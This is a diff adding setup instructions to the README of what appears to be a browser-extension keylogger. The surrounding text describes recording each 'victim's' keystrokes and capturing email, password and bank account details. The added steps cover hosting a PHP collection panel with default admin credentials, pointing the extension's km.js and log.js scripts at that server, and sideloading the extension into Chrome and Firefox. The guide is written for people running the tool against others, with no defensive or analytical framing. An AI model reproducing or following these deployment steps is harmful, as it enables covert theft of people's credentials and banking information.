@@ -22,6 +22,45 @@ Keystrokes recorded with each victim in a single html file: identification with 
 Displays only Email address and password  
 # Banque Account
 Displays Banque Account (French only)
-# Configuration
+
+# Installation Server
+Start your wampserver,xhamp ....etc and send the "panel" file to your server
++ panel
+1. config.php
+
+usernam = admin
+password =admin
+
+2. yt.php and yt2.php
+
+If you want : SET YOUR DATETIMEZONE HERE :
+
+$date = new DateTime("now", new DateTimeZone('Africa/Dakar') ); //SET YOUR DATETIMEZONE HERE 
+your can use Europe/Paris or America/New_York	. 
+if your want to change DATETIMEZONE clique here https://www.php.net/manual/en/timezones.php
+
+
+# Configuration Extension 
+
+Open the extension folder .
++ km.js 
+and 
++ log.js 
+put the name of your website for exemple `http://127.0.0.1/panel/ 
+and save changes 
+
+# Installation Extension Chrome / Mozilla Firefox
++ Chrome
+1. Open Chrome browser and navigate to `chrome://extensions`
+2. Select "Developer Mode" and then click "Load unpacked extension...
+3. click 'manifest.json`
+
++ Mozilla Firefox
+1. Open Firefox browser and navigate to `about:debugging`
+2. Click "Load Temporary Add-on"  
+3. click `manifest.json`
+
+# Demo Video Youtube Only Mozilla Firefox (French version )
+
 https://www.youtube.com/watch?v=Mb6-8u010Xs
 
